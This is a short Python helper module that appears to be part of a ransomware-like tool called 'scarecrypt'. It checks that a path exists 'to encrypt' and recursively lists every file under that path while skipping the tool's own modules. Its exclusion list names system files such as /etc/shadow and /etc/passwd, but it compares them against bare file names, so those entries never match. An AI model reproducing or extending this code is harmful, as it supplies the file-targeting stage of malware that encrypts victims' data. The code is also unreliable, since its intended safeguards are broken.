import os
from pathlib import Path


def check_path(input_path):
    if os.name == 'nt':
        if Path(input_path).exists():
            print("Great ! The Path Exists on Machine. Go Ahead !")
            return True
        else:
            print("The path you're trying to encrypt does not exist !")
            return False
    else:
        if Path(input_path).exists():
            print("Great ! The Path Exists on Machine. Go Ahead !")
            return True
        else:
            print("The path you're trying to encrypt does not exist !")
            return False



def find_all_files(path):
    files_list = []
    for root, dirs, files in os.walk(path):
        for file in files:
            complete_file_path = os.path.join(root, file)
            if file in ["mailcreds.py", "cryptmodule.py", "mailmodule.py", "scarecrypt.py", "pathchecks.py", "/boot/vmlinuz", "/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/hosts", "/etc/hostname", "/etc/group", "/etc/resolv.conf", "/var/log/messages"]:
                continue
            else:
                files_list.append(complete_file_path)
    return files_list

